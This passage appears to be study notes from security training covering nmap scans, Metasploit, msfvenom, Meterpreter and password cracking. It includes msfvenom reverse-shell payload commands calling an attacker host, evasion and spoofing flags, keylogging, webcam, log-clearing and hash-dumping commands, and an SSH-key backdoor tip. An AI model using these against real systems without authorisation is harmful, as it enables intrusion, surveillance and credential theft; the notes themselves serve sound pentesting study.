5. Detect versions
6. Detect OS
7. Traceroute
8. Scripts
9. Write output

### nmap Live Host Discovery
This section aims to answer the question: which systems are up?

A summary of nmap commands:

| Scan Type | Command |
| :------: | :-----: |
| ARP | sudo nmap -PR -sn [MACHINE_IP/24] |
| ICMP Echo| sudo nmap -PE -sn [MACHINE_IP/24] |
| ICMP Timestamp | sudo nmap -PP -sn [MACHINE_IP/24] |
| ICMP Address Mask | sudo nmap -PM -sn [MACHINE_IP/24] |
| TCP SYN Ping | sudo nmap -PS22,80,443 -sn [MACHINE_IP/30] |
| TCP ACK Ping | sudo nmap -PA22,80,443 -sn [MACHINE_IP/30] |
| UDP Ping | sudo nmap -PU53,161,162 -sn [MACHINE_IP/30] |
| Masscan | masscan [MACHINE_IP/24] -p[PORT_NUM] |

Note: add **-sn** for host discovery without port-scanning

Other options:

| Option | Purpose |
| :------: | :-----: |
| -n | No DNS lookup |
| -R | Reverse-DNS lookup for all hosts |
| -sn | Host discovery only |

### nmap Basic Port Scanning
With nmap, ports can be in the following states:
+ Open - a service is listening on the port
+ Closed - no service is listening on the port; port is accessible
+ Filtered - cannot determine if port is open/closed; port is inaccessible
+ Unfiltered - cannot determine if port is open/closed; port is accessible; encountered with ACK scans (i.e. **-sA**)
+ Open|Filtered - cannot determine whether the port is open or filtered
+ Closed|Filtered - cannot determine whether a port is closed or filtered

A summary of nmap commands:

| Scan Type | Command |
| :------: | :-----: |
| TCP Connect | nmap -sT [MACHINE_IP] |
| TCP SYN | sudo nmap -sS [MACHINE_IP] |
| UDP | sudo nmap -sU [MACHINE_IP] |

Other options:

| Option | Purpose |
| :------: | :-----: |
| -p- | All ports |
| -p1-1023 | Scan ports 1 to 1023 |
| -F | 100 most common ports |
| -r | Scan ports in consecutive order |
| -T<0-5> | Intensity; -T0 is slowest, -T5 is fastest |
| --max-rate 50 | rate <= 50 packets/sec |
| --min-rate 15 | rate >= 15 packets/sec |
| --min-parallelism 100 | At least 100 probes in parallel |

### nmap Advanced Port Scanning
Some scans with specific flags can be useful against specific systems.

The following scans can be used for *targets behind a stateless firewall*:

| Scan Type | Command |
| :------: | :-----: |
| TCP Null | sudo nmap -sN [MACHINE_IP] |
| TCP FIN | sudo nmap -sF [MACHINE_IP] |
| TCP Xmas (i.e. FIN, PSH, URG) | sudo nmap -sX [MACHINE_IP] |

Using a flag combination that does not match the SYN packet can possibly deceive these firewalls. Note: stateful firewalls will block all of these packets.

The *Maimon scan* is simply an honorable mention: 

| Scan Type | Command |
| :------: | :-----: |
| TCP Maimon | sudo nmap -sM [MACHINE_IP] |

Note: this scan will not work in most modern networks

These scans can be used *to discover and map firewall rules*:

| Scan Type | Command |
| :------: | :-----: |
| TCP ACK | sudo nmap -sA [MACHINE_IP] |
| TCP Window | sudo nmap -sW [MACHINE_IP] |
| Custom TCP | sudo nmap --scanflags URGACKPSHRSTSYNFIN [MACHINE_IP] |

These commands allow scanning *using spoofed IP/MAC addresses*:

| Scan Type | Command |
| :------: | :-----: |
| Spoofed Source IP | sudo nmap -S [SPOOFED_IP] [MACHINE_IP] |
| Spoofed MAC Address | --spoof-mac [SPOOFED_MAC] |

Note: spoofed MAC addresses only work if the attacking and target machines are in the same network; for these attacks to work, monitoring network traffic is needed

These commands allow the use of *decoy IP addresses*:

| Scan Type | Command |
| :------: | :-----: |
| Decoy | nmap -D [DECOY_IP],ME [MACHINE_IP] |

*Idle/zombie scans* are a variation of spoofed IP addresses, using an idlze host to receive responses. The commands are as follows:

| Scan Type | Command |
| :------: | :-----: |
| Idle/zombie | sudo nmap -sI [ZOMBIE_IP] [MACHINE_IP] |

The key is to note the IP IDs, particularly the RST packets:
+ If the difference is 1, that means the port is closed. 
+ If the difference is 2, it means the port is open.
+ If there is no difference, a firewall may have blocked transmission

Note: this is useless if the host is busy (i.e. not idle)

Dividing or *fragmenting packets* into smaller sizes can help maneuver firewalls/IDSs. The following options achieve this:

| Option | Command |
| :------: | :-----: |
| Fragment into 8 bytes | -f |
| Fragment into 16 bytes | -ff |

Other useful options include:

| Option | Command |
| :------: | :-----: |
| --reason | Explains how conclusion is made |
| -v | Verbose |
| -vv | Very verbose |
| -d | Debugging |
| -dd | Debugging more details |

### nmap Post Port Scanning
These steps follow port scanning, particularly service detection, OS detection, nmap scripting engine, and saving scan outputs.

These options probe for *running services in available ports*:

| Option | Command |
| :------: | :-----: |
| -sV | Determine service/version on open ports |
| -sV --version-light | Probe intensity 2 |
| -sV --version-all | Probe intensity 9 |

This option *detects OS*:

| Option | Command |
| :------: | :-----: |
| -O | Detect OS |

Note: OS fingerprints may get distorted due to virtualisation; do not trust completely

This option *runs traceroute*:

| Option | Command |
| :------: | :-----: |
| --traceroute | Run traceroute to target system |

Use these options to *run scripts*:

| Option | Command |
| :------: | :-----: |
| --scripts=[SCRIPT] | Run defined scripts |
| -sC or --scripts=default | Run default scripts |

Note: **-A** can be used to combine **-sV -O -sC --traceroute**

Use these options to *control output*:

| Option | Command |
| :------: | :-----: |
| -oN | Save output in normal format |
| -oG | Save output in grepable format |
| -oX | Save output in XML format |
| -oA | Save output in normal, grepable, and XML formats |

## Network Attacks
### Sniffing
*Sniffing* occurs when network packets are captured to collect information about a target. This occurs when data is exchanged in cleartext.

Note: this attack requires access to network traffic (e.g. via wiretap, switch with port mirroring)

Tools that can be used for this attack include:
+ Tcpdump - open source CLI program that works on many OSes
+ Wireshark - open source GUI program
+ Tshark - CLI alternative to Wireshark

E.g. tcpdump to sniff POP3
```
sudo tcpdump port 110 -A
```

Mitigation include:
+ Adding an encryption layer on top of network protocols (e.g. TLS, SSH instead of telnet)

### Man-in-the-Middle (MITM)
*MITM* attacks occur when a target system believes they are communicating with a legitimate destination but in reality is an attacker. This occurs when the two parties do not confirm authenticity and integrity of messages. 

Tools that can be used for this attack include:
+ [Ettercap](https://www.ettercap-project.org/)
+ [Bettercap](https://www.bettercap.org/)

Mitigation include:
+ Proper authentication (i.e. PKI) 
+ Encryption (i.e. TLS)
+ Signing of exchanged messages (e.g. trusted root certificates)

### Password Attack
Attacks against passwords attempt to bypass authentication. These are usually done by:
+ Password Guessing - requires knowledge of the target (e.g. pet's name, DoB)
+ Dictionary Attack - use of a wordlist or dictionary
+ Brute Force Attack - trying all possible character combinations

## Cryptography
Cryptography is used to protect confidentiality, integrity, and authenticity. It is the practice and study of techniques for secure communication and data protection where we expect the presence of adversaries and third parties.

Key terminologies include:
+ *Plaintext* - original, readable message or data before encryption (e.g. document, image, multimedia file, any other binary data)
+ *Ciphertext* - scrambled, unreadable version of the message after encryption
+ *Cipher* - algorithm or method to convert plaintext into ciphertext and back again
+ *Key* - string of bits the cipher uses to encrypt or decrypt data
+ *Encryption* - process of converting plaintext into ciphertext using a cipher and a key
+ *Decryption* - reverse process of encryption, converting ciphertext back into plaintext using a cipher and a key

The two main categories of encryption:
1. *Symmetric* - uses the same key to encrypt and decrypt data; also known as *private key cryptography* (e.g. DES, 3DES, AES)
2. *Asymmetric* - uses a pair of keys, one to encrypt (i.e. the public key) and the other to decrypt (i.e. the private key)

### RSA
*RSA* is a public-key encryption algorithm. It is based on factoring large numbers. RSA is used for digital signtaures, key transport, and authentication (i.e. proves the identity of the person you are talking to via digital signing)

The main variables to know include:
+ *p* and *q* are large prime numbers
+ *n* is the product of p and q
+ The public key is n and *e*
+ The private key is n and *d*
+ *m* is used to represent the original message (i.e. plaintext)
+ *c* represents the encrypted text (i.e. ciphertext)

Useful tools include [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) and [rsatool](https://github.com/ius/rsatool).

### Diffie-Hellman Key Exchange
*Diffie-Hellman* is often used with RSA for key agreement. This can provide the means to establish a shared key for symmetric cryptography for the key exchange.

Steps of this process is as follows:
1. Agree on public variables *p* and *g*
2. Each party chooses a private integer *a* and *b*
3. Each party calculates their public key *A = g^a mod p* and *B = g^b mod p*
4. Each party sends the keys to each other (i.e. the key exchange)
5. Calculate shared secret using the received public key using their own private key

### SSH Keys
SSH key authentication uses public and private keys to prove the client is valid and an authorised user on the server. By default, these are RSA keys. However, you can choose which algorithm to generate and add a passphrase to encrypt the SSH key.

**ssh-keygen**: program to generate key pairs

The *~/.ssh folder* is the default place to store these keys for OpenSSH. The *authorized_keys* file holds the public eys that are allowed to access to the server if key authentication is enabled.

SSH keys are an excellent way to upgrade a reverse shell. Leaving an SSH key in the authorized keys file on a machine can be a useful backdoor for CTFs, penetration testing, and red teaming.

### Digital Signatures & Certificates
*Digital signatures* provide a way to verify the authenticity and integrity of a digital message or document. This means we know who created or modified these files. 

The simplest form of digital signature is encrypting the document with your private key. To verify this signature, they would encrypt it with your public key and check if the files match.

*Certificates* are linked to digital signatures. These certify that the website you are visiting is legitimate. This is commonly used in HTTPS.

### PGP & GPG
*Pretty Good Privacy (PGP)* is software that that can encrypt files. 

*GnuPG (GPG)* is an open-source implementation of the OpenPGP standard. 

GPG is commonly used in email to protect confidentiality of email messages. It can be used to sign an email and confirm its integrity. Additionally, GPG can be used to decrypt files.

**gpg --import [key_file.key]**: import key 

**gpg --decrypt [message.gpg]**: decrypt messages

## Hashing
A *hash value* is a fixed-size string that is computed by a hash function. 

A *hash function* takes an input of an arbitrary size and returns an output of fixed length (i.e. the hash value). Good hashing algorithms will be relatively fast to compute and slow to reverse. Any slight change in the input data should cause a significant change in the output.

*Hashing* helps protect data's integrity and ensure password confidentiality. For instance, two main use cases for hashing include:
1. Password storage (i.e. authentication)
2. Data integrity

### Password Storage
When it comes to passwords, these are three insecure practices:
+ Storing passwords in plaintext
+ Storing passwords using a deprecated encryption
+ Storing passwords using an insecure hashing algorithm

Instead of storing passwords in plaintext, storing hash values is more secure. However, these are still vulnerable by using *rainbow tables*, which are lookup tables of hashes to plaintext (e.g. [CrackStation](https://crackstation.net/), [Hashes.com](https://hashes.com/en/decrypt/hash]).

*Salting* is a means to protect against rainbow tables. The salt is a randomly generated value stored in the database and should be unique to each user. These are added to either the start or the end of the password before it is hashed.

### Recognising Password Hashes
On Linux, password hashes are stored in */etc/shadow*, which is only readable by root. The file contains password information, where each line contains nine fields separated by colons. More information can be found using **man 5 shadow**.

The encrypted password field contains the hashed passphrase with four components(e.g. $prefix$options$salt$hash):
1. prefix (i.e. algorithm id)
2. options (i.e. parameters)
3. salt
4. hash

Some of the most common Unix-style password prefixes you might encounter include:
| Prefix | Algorithm |
| :------: | :-----: |
| $y$ | yescrpyt |
| $gy$ | gost-yescrypt |
| $7$ | scrypt |
| $2b$, $2y$, $2a$, $2x$ | bcrypt |
| $6$ | sha512crypt |
| $md5 | SunMD5 |
| $1$ | md5crypt |

More details can be found using **man 5 crypt**.

A usefule resource for hash formats and password prefixes can be found in [Hashcat Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page.

MS Windows passwords are hashed using NTLM, a variant of MD4. They are visually identical to MD4 and MD5 hashes. Password hashes are stored in the *Security Accounts Manager (SAM)*. 

### Data Integrity Checking
Hashing can be used to check that files have not been altered. Even if a single bit changes, the hash will change significantly. You can use them to ensure that files have not been modified or to ensure that a downloaded file is identical to the file on the web server. 

*Keyed-Hash Message Authentication Code (HMAC)* is a type of message authentication code (MAC) that uses a cryptographic hash function in combination with a secret key to verify the authenticity of data. These can be used to ensure that the person who created the HMAC is who they say they are (i.e. authenticity) by using a secret key. This is done in with the following steps:
1. A secret key is padded to the block size of the hash function.
2. A padded key is XORed with a constant (i.e. block fo zeroes or ones).
3. Message is hashed using the hash function with the XORed key.
4. Result from step 3 is then hashed again with the same hash function but using the padded key XORed with another constant.
5. The final ouput is the HMAC value, typically a fixed-size string.

Technically, the HMAC function is calculated using the following expression:

*HMAC(K,M) = H((K⊕opad)||H((K⊕ipad)||M))*

Note: *M* and *K* are the message and key

## Cracking Password Hashes
Online tools such as [Hashcat](https://hashcat.net/hashcat/) and [John the Ripper](https://www.openwall.com/john/) can be used to crack hashes.

### Hashcat
Hashcat uses the following basic syntax:

**hashcat -m <hash_type> -a <attack_mode> hashfile wordlist**

### John the Ripper
John uses the following basic syntax:

**john [options] [file_path]**

+ **john --wordlist=[path_to_wordlist] [path_to_file]**: automatic cracking

+ **john --format=[format] --wordlist=[path_to_wordlist] [path_to_file]**: format-specific cracking

Note: tools such as [hash-id.py](https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master) is a useful hash-identifier tool to determine formats.

**john --list=formats**: list all formats

### Windows Authentication Cracking
You can acquire NTHash/NTLM hashes by dumping the SAM database using tools such as Mimikatz or using the Active Directory database NTDS.dit. Using John, use **--format=nt**.


### /etc/shadow Cracking:
To crack /etc/shadow passwords, you must combine it with the /etc/passwd file. You can do this using the *unshadow* tool.

**unshadow [path_to_passwd_file] [path_to_shadow_file]**: invokes shadow tool

Note: you can use the entire files or just the relevant line from each

### Single Crack Mode:
Single crack mode uses word mangling, which mutates a starting word (e.g. a username) to generate a wordlist based on relevant factors for the target you're trying to crack. John's word mangling is also compatible with the GECOS field, which contains general information about a user found in /etc/shadow.

**john --single --format=[format] [path_to_file]**: use single crack mode

Note: prepending the hash with the user name is needed (e.g. adding mike to 1efee03cdcb96d90ad48ccc7b8666033 -> mike:1efee03cdcb96d90ad48ccc7b8666033)

### Custom Rules
John can create passwords dynamically by defining password rules. This is beneficial when you know more information about the password structure of a target (e.g. password complexity requirements).

Custom rules are defined in */etc/john/john.conf*. A rule entry will look like the following:

[List.Rules:RuleName] -> used to define the name of your rule; this is what you will use to call your custom rule a John argument

cAz"[0-9] [!$%#@]" -> rules and character append/prepend 

The most common modifiers include:
+ Az - takes the word and appends it with the characters you define
+ A0 - takes the word and prepends it with the characters you define
+ c - capitalises the character positionally

Common modifier patterns include:
+ [0-9] - will include numbers 0 to 9
+ [0] - will include only the number 0
+ [A-z] - will include both upper and lowercase
+ [A-Z] - will include only uppercase letters
+ [a-z] - will include only lowercase letters

Note: you can read more about custom rules in [Openwall](https://www.openwall.com/john/doc/RULES.shtml).

**john --wordlist=[path_to_wordlist] --rule=[rule_name] [path_to_file]**: invoke custom rule exploitation

### Cracking Password Protected Zip Files
The *zip2john*  tool can be used to convert the zip file into a hash format that John can understand and crack.

The basic syntax is as follows:

**zip2john [options] [zip_file] > [output_file]**

Note: [options] allows you to pass specific checksum options, which is often not necessary; e.g. zip2john zipfile.zip > zip_hash.txt

The output from zip2john can now be cracked using regular wordlists.

### Cracking Password Protected RAR Files
Similar to zip files, the *rar2john* tool can be used to convert the rar file into a hash format.

The basic syntax is as follows:

**rar2john [rar_file] > [output_file]**

Once again, the output from rar2john can be directly cracked.

### Cracking SSH Keys
John can be used to crack SSH private key passwords of id_rsa files. This can be done using the *ssh2john* tool. 

The basic syntax is as follows:

**ssh2john [id_rsa_private_key_file] > [output_file]**

Note: if you do not have ssh2john installed, it can be found python */usr/share/john/ssh2john.py* on Kali

Once again, the ouput from ssh2john can be directly cracked.

## Metasploit
*Metasploit* is a powerful tool that can support all phases of a penetration testing engagement. It comprises of a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, etc.

**msfconsole**: launch Metasploit

Some basic commands:
+ **use [module]**: set context/module
+ **show options**: print options related to the module (i.e. variables)
+ **back**: exit a context
+ **info [module]**: print additional information (i.e. extra details)
+ **search [parameter]**: search database for relevant modules; parameters can be CVE numbers, names, type, target systems, etc
+ **exploit**: run a exploit/module; add **-z** to background the session as it opens
+ **background**: background a session and go back to the msfconsole prompt
+ **sessions**: see existing sessions; add **-i [session_number]** to interact with a session

Some basic commands for setting variables:
+ **set [variable] [value]**: set parameter
+ **unset [variable]**: reset parameter; can use **unset all** to reset all parameters
+ **setg [variable] [value]**: set a global parameter
+ **unset [variable]**: reset a global parameter

### Port Scanning
Metasploit has a number of modules to scan open ports on the target system and network (e.g. search portscan). Note: you can also use nmap commands using the msfconsole prompt. 

For speedier scanning, Metasploit is not the first choice. However, it does provide useful modules for the following:
+ UDP service identification -> the *scanner/discover/udp_sweep* module allows to quickly identify services running over UDP (i.e. quick way to identify DNS/NetBIOS)
+ SMB scans -> auxiliary modules such as *smb_enumshares* and *smb_version* are especially useful in corporate networks

### Metasploit Database
Using the database function can simplify project management when working with several targets.

To initialise:
+ run **systemctl start postgresql** to start the PostgreSQL database
+ run **msfdb init** to initialise the Metasploit database
+ run **msfconsole** as normal; check database status using **db_status**

**help**: shows database backends commands menu

**workspace**: access workspaces; **-a** to add a workspace, **-d** to delete a workspace; **-h** to list available options

Useful commands:
+ **db_nmap** -> run Nmap scan that will be saved to the database
+ **hosts** -> lists all scanned hosts; add **-R** to set RHOSTS to saved hosts
+ **services** -> list all scanned services; add **-S [service]** to search for specific services; useful to search for http, ftp, smb, ssh, rdp

### Vulnerability Scanning
Finding vulnerabilities will rely heavily on your ability to scan and fingerprint the target. 

Use the **info** command for any module to have a better understanding of its use and purpose.

### Exploitation
Most exploits will have a preset default payload. You can use **show payloads** to list other commands you can use.

Once you have decided on a payload, you can use **set payload** to make your choice. Note: choosing a working payload could become a trial and error process due to the enviromental/OS restrictions (i.e. firewall rules, anti-virus, file writing, or program availability). 

Remember, a session can be backgrounded using **-z** or CTRL+Z. Some additional session commands:
+ **sessions** ->  list all active sessions
+ **sessions -i [session_id]** -> interact with an existing session
+ **sessions -h** -> list options (e.g. **-C** to run a Meterpreter command, **-K** to terminate all sessions)

### Msfvenom
*Msfvenom* allows you to access all payloads available in the Metasploit framework, allowing you to create them in many different formats (e.g. PHP, exe, dll, elf) and for many different target systems (e.g. Apple, Windows, Android, Linux)

**msfvenom -l payloads**: lists all framework payloads

**msfvenom --list formats**: list supported output formats

Some tools include:
+ Encoders - encodes the payload; modern obfuscation techniques or learning methods to inject shellcode are better; eg. **msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64**
+ Handlers - catches callbacks from reverse shells or Meterpreter (i.e. a listener); follows these steps: 1) use exploit, 2) set payload, 3) set lhost/lport variables, 4) run

Based on the target's configuration (i.e. OS, webserver, interpreter, etc), msfvenom can be used to create payloads in proper formats. Here are examples often used:
+ Linux Executable and Linkable Format (elf) -> **msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf**; note that executable permissions need to be set using **chmod +x [shell_elf_file]**
+ Windows -> **msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe**
+ PHP -> **msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php**
+ ASP -> **msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp**
+ Python -> **msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py**

Note: for the above examples, a handler will be needed as these are reverse payloads

### Meterpreter
*Meterpreter* is a Metasploit payload that runs on a target system and acts as an agent within a command and control architecture. Interaction with the target OS and files is possible using Meterpreter's commands.

Meterpreter runs on the target system in memory (i.e. RAM) and does not write itself to the disk (i.e. not installed). This feature is added to avoid detection by AVs, which scans new files on disk. Meterpreter also avoids detection by network-based IPS/IDS by using encrypted communication with the server where Metasploit runs (i.e. your attacking machine using TLS). Note: this feature only provides some degree of stealth as Meterpreter is recognised by major AVs.

Your decision on which version of Meterpreter to use will be decided by three factors:
1. The target's OS (i.e. Linux, Windows, Mac, Android)
2. Components available on the target system (e.g. Python, PHP website)
3. Network connection types you can have with the target system (e.g. TCP, HTTPS reverse connection, IPv6 or IPV4)

**help** on any Meterpreter session will list all available commands. These commands include:

Core commands
+ **background**: backgrounds the current session
+ **exit**: terminate the session
+ **guid**: get the session GUID
+ **help**: display the help menu
+ **info**: displays information about a Post module
+ **irb**: opens an interactive Ruby shell on the current session
+ **load**: loads one or more Meterpreter extensions
+ **migrate**: migrate Meterpreter to another process
+ **run**: executes a Meterpreter script or Post module
+ **sessions**: quickly switch to another session

File system commands
+ **cd**: change directory
+ **ls**: list files in the current directory; **dir** works the same way
+ **pwd**: print current working directory
+ **edit**: edit a file
+ **cat**: show contents of a file to the screen
+ **rm**: delete the specified file
+ **search**: search for files
+ **upload**: upload a file or directory
+ **download**: download a file or directory

Networking commands
+ **arp**: display the host ARP cache
+ **ifconfig**: displays the network interfaces available on the target system
+ **netstat**: displays the network connections
+ **portfwd**: forwards a local port to a remote service
+ **route**: view and modify the routing table

System commands
+ **clearev**: clear the event logs
+ **execute**: execute a command
+ **getpid**: show the current process identifier
+ **getuid**: show the user that Meterpreter is running as
+ **kill**: terminates a process
+ **pkill** terminates processes by name
+ **ps**: list running processes
+ **reboot**: reboots the remote computer
+ **shell**: drops into a system command shell
+ **shutdown**: shuts down the remote computer
+ **sysinfo**: gets information about the remote system (e.g. OS)

Other commands
+ **idletime**: returns the number of seconds the remote user has been idle
+ **keyscan_dump**: dumps the keystroke buffer
+ **keyscan_start**: starts capturing keystrokes
+ **keyscan_stop**: stops capturing keystrokes
+ **screenshare**: allows you to watch the remote user's desktop in real time
+ **screenshot**: grabs a screenshot of the interactive desktop
+ **record_mic**: records audio from the default microphone for X seconds
+ **webcam_chat**: starts a  video chat
+ **webcam_list**: lists webcams
+ **webcam_snap**: takes a snapshot from the specified webcam
+ **webcam_stream**: plays a video stream from the specified webcam
+ **getsystem**: attempts to elevate your privilege to that of local system
+ **hashdump**: dumps the contents of the SAM database

Note: these commands may not all work due to various factors (e.g. target system does not have web cam or is running on a VM)

## Web Applications
When you visit a website, your browser makes a request to a web server asking for information about the page you are trying to visit. It will then respond with data that your browser uses to show you the page. 

There are two major components that make up a website:
1. Front End (Client-Side) - the way your browser renders a website
2. Back End (Server-Side) - server that processes your request and returns a response

Websites are primarily created using:
+ HyperText Markup Language (HTML) - to build websites and define their structure
+ CSS - to add styling options
+ JavaScript - to implement complex features on pages using interactivity

In a browser, you can view *Page Source* to see website elements. Note that sometimes, sensitive information can be left here (e.g. login credentials)

Other website components include:
+ *Load Balancers* - provides two main features: 1) ensure high traffic websites can handle the load, and 2) provide a failover if a server becomes unresponsive
+ *Content Delivery Networks (CDN)* - cuts down traffic to a busy website by allowing hosting of static files from your website to other servers; the nearest server is physically located and sends the request there for efficiency
+ *Databases* - communicates with webservers to store and recall data; examples include MySQL, MSSQL, MongoDB, Postgred, etc
+ *Web Application Firewall (WAF)* - protects the web servers from hacking or DoS attacks (e.g. bot detection, rate limiting)

A *web server* is a software that listens for incoming connections and uses the HTTP protocol to deliver web content to clients. Common web server software include Apache, Nginx, IIS, and NodeJS. Web servers delivers files from the root directory (e.g. /var/www/html for Linux OS, C:\inetpub\wwwroot for Windows OS).

Web servers use *virtual hosts* to host multiple websites with different domain names. They do this using text-based configuration files. There is no limit to the number of different websites you can host on a web server.

*Static content* is content that never changes. Common examples are pictures, JavaScript, CSS, HTML, etc. 

*Dynamic content* is content that could change with different requests. Examples include searching in a website. These changes are done in the backend using programming and scripting languages. Some examples of the languages include PHP, Python, Ruby, NodeJS, Perl, etc. 

### Uniform Resource Locator (URL)
A *Uniform Resource Locator (URL)* is used as an instruction on how to access a resource on the net. URLs have multiple parts. Take for example http://user:password@tryhackme.com:80/view-room?id=1#task3
+ Scheme - instructs on what protocol to use (e.g. HTTP, HTTPS, FTP)
+ User - some services require authentication to log in
+ Host - domain name or IP address of the server
+ Port - port you are going to connect to (e.g. TCP ports 80/8080 for HTTP, 443/8443 for HTTPS)
+ Path - file name or location of the resource
+ Query String - extra bits of information that can be sent to the requested path
+ Fragment - reference to a location on the actual page requested, commonly used for pages with long content

### HTTP Messages
HTTP messages are packets of data exchanged between a user (i.e. the client) and the web server. There are two types of HTTP messages:
+ HTTP Requests - sent by the user to trigger actions on the web application
+ HTTP Responses - sent by the server in response to the user's request

Each message follows a specific format that helps both the user and the server communicate smoothly:
+ Start Line - like an introduction; tells what kind of message is being sent (i.e. whether a request or a response) and gives details about how the message should be handled
+ Headers - key-value pairs that provide extra information; gives instructions to both client and server for handling the request/response; can cover security, content types, etc
+ Empty Line - divider that separates the header from the body
+ Body - where actual data is stored; might include data user wants to send or where the server puts the content that the user requested

### HTTP Requests: Request Line & Methods
The *request line* or start line is the first part of an HTTP request and has three main parts:
+ HTTP method
+ URL path
+ HTTP version

E.g. METHOD /path HTTP/version

HTTP methods show the client's intended action when making HTTP requests. The most common include:
+ GET - used for getting information from a web server; Note: avoid putting sensitive info like tokens or passwords
+ POST - used for submitting data to the web server and potentially creating new records; Note: always validate and clean input to avoid attacks (e.g. SQL injection or XSS)
+ PUT - used for submitting data to a web server to update information; Note: ensure user is authorised to make changes
+ DELETE - used for deleting information/records from a web server; Note: ensure user is authorised to delete resources
+ PATCH - updates part of a resource; Note: always validate data to avoid inconsistencies
+ HEAD - works like GET but only retrieves headers (i.e. for matadata)
+ OPTIONS - tells you what methods are available; Note: many servers disable this for security reasons
+ TRACE - shows which methods are allowed; Note: many servers disable this for security reasons
+ CONNECT - used to create a secure connection; Note: it is not as common but is critical for encrypted communication

The *URL path* tells the server where to find the resource the user is asking for. 

E.g. URL - https://tryhackme.com/api/users/123, path - /api/users/123

It is crucial to follow these secure practices to avoid common attacks:
+ Validate the URL path to prevent unauthorised access
+ Santisise the path to avoid injection attacks
+ Protect sensitive data by conducting privacy and risk assessments

The *HTTP version* shows the protocol version used to communicate between the client and server. Here are the most common ones:
+ HTTP/0.9 - the first version; only supported GET requests
+ HTTP/1.0 - added headers and better support for different types of content; improved caching
+ HTTP/1.1 - brought persistent connections, chunked transfer coding, and better caching; it is still widely used today
+ HTTP/2 - introduced multiplexing, header compression, and prioritisation for faster performance
+ HTTP/3 - built on HTTP/2 but uses QUIC for quicker and more secure connections

### HTTP Request: Headers & Body
*Headers* are additional bits of data you can send to the web server when making requests. Common headers include:
+ Host - specifies the name of the web server the request is for (e.g. tryhackme.com)
+ User-Agent - information about the web browser the request is coming from (e.g. Mozilla/5.0)
+ Referer - indicates the URL from which the request came from (e.g. https://www.google.com/)
+ Cookie - information the web server previously asked the web browser to store (e.g. user_type=student, room=introtowebapplication, room_status=in_progress)
+ Content-Type - describes what type or format of data is in the request (e.g. application/json)

For POST and PUT, where data is sent to the web server, data is located inside the *Request Body*. The formatting of the data can take many forms. Some common ones include:
+ URL Encoded (i.e. application/x-www-form-urlencoded) - data is structured in key-value pairs, each separated by & (e.g. key1=value1&key2=value2); special characters are percent-encoded
+ Form Data (i.e. multipart/form-data) - allows multiple data blocks to be sent where each block is separated by a boundary string, which is defined in the header (e.g. boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW)
+ JSON (i.e. application/json) - data sent using the JSON structure; formatted in pairs of name:value; multiple pairs are separated by comas and all contained within { } braces
+ XML (i.e. application/xml) - data is structured inside labels called tags, which can be nested within each other (e.g. <user><name>Aleksandra</name></user> 

Common request headers include:
+ Host - specify which website you require
+ User-Agent - your browser software and version number; aids in formatting website to your browser needs
+ Content-Length - tells web server how much data to expect in the web request
+ Accept-Encoding - tells web server what types of compression methods your browser supports for smaller data transmission
+ Cookie - data sent to server to help remember your information

Common response headers include:
+ Set-Cookie - information to store, which gets sent back to the web server on each request
+ Cache-Control - how long to store the content of the response in the browser's cache before requesting again
+ Content-Type - tells the client what type of data is being returned (e.g. HTML, CSS, JavaScript, images, etc)
+ Content-Encoding - what method has been used to compress the data for smaller data transmission

### HTTP Response: Status Line & Status Codes
The first line in every HTTP response is the *Status Line*. This includes three parts:
+ HTTP version - details which version of HTTP is used
+ Status Code - three-digit number showing the outcome of the request
+ Reason Phrase - short message explaining the status code in human-readable terms

Common HTTP status codes:
| Code | Description |
| :-----: | :--------: |
| 200 - OK | Request completed successfully |
| 201 - Created | Resources has been created |
| 301 - Moved Permanently | Redirects to a new webpage or tells search engines to look elsewhere |
| 302 - Found | Similar to 302 but only a temporary change |
| 400 - Bad Request | Something is wrong or missing in the request |
| 401 - Not Authorised | Not currently allowed to view resource |
| 403 - Forbidden | No permission to view the resource |
| 405 - Method Not Allowed | Resource does not allow the method request |
| 404 - Page Not Found | Requested resource does not exist |
| 500 - Internal Service Error | Server has encountered some error |
| 503 - Service Unavailable | Server is either overloaded or down for maintenance |

### HTTP Response: Headers & Body
*Response headers* provide essential information that the client and server need to process everything correctly. These include:
+ Date - shows exact data and time when the response was generated (e.g. Date: Fri, 23 Aug 2024 10:43:21 GMT)
+ Content-Type - tells the client what kind of content it is getting (i.e. HTML, JSON); includes the character set to help the browser display it correctly (e.g. Content-Type: text/html; charset=utf-8)
+ Server - shows the kind of server software is handling the request (e.g. Server: nginx); Note: revealing server information might be useful for attackers, so consider removing/obscuring this
+ Set-Cookie - sends cookies from the server to the client (e.g. sessionId=38af1337es7a8); can use the HttpOnly flag (i.e. cannot be accessed by JavaScript) and the Secure flag (i.e. only sent over HTTPS)
+ Cache-Control - tells the client how long it can cache the response before checking in again (e.g. Cache-Control: max-age=600); use no-cache to prevent sensitive info from being cached
+ Location - used in redirection responses (i.e. 3XX status codes); tells the client where to go next if the resource has moved

The *response body* is where the actual data lives. These can be HTML, JSON, images, etc. Note: to prevent injection attacks (e.g. XSS), always sanitise and escape any data (i.e. user-generated content) before including them in the response

### Security Headers
HTTP *Security Headers* help improve overall security of a web application to provide mitigations against attacks such as XSS, clickjacking, etc. These headers include:
+ Content-Security-Policy (CSP) - additional security layer that can help mitigate against common attacks; provides a way for administrators to say what domains or sources are considered safe (i.e. default-src, script-src, style-src); e.g. Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.tryhackme.com; style-src 'self'
+ Strict-Transport-Security (HSTS) - ensures that web browsers will always connect over HTTPS; e.g. Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
+ X-Content-Type-Options - used to instruct browsers not to guess the MIME time of a resource but only use the Content-Type header; e.g. X-Content-Type-Options: nosniff
